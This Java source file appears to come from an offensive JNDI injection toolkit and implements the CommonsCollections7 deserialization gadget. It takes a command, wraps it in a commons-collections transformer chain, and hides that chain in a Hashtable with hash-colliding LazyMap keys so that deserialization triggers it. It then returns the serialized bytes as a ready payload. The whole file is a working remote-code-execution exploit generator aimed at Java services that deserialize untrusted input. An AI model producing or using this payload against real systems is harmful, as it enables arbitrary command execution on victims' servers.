package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.utils.Reflections;
import com.nu1r.jndi.gadgets.utils.cc.TransformerUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class CommonsCollections7 implements ObjectPayload<Hashtable> {

    public byte[] getBytes(PayloadType type, String... param) throws Exception {
        String              command          = param[0];
        final Transformer   transformerChain = new ChainedTransformer(new Transformer[]{});
        final Transformer[] transformers     = TransformerUtil.makeTransformer(command);
        Map                 innerMap1        = new HashMap();
        Map                 innerMap2        = new HashMap();

        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
        lazyMap1.put("yy", 1);

        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
        lazyMap2.put("zZ", 1);

        // Use the colliding Maps as keys in Hashtable
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 2);

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);

        // Needed to ensure hash collision after previous manipulations
        lazyMap2.remove("yy");

        //序列化
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
        oos.writeObject(hashtable);
        byte[] bytes = baous.toByteArray();
        oos.close();

        return bytes;
    }

    @Override
    public Hashtable getObject(String command) throws Exception {
        return null;
    }
}
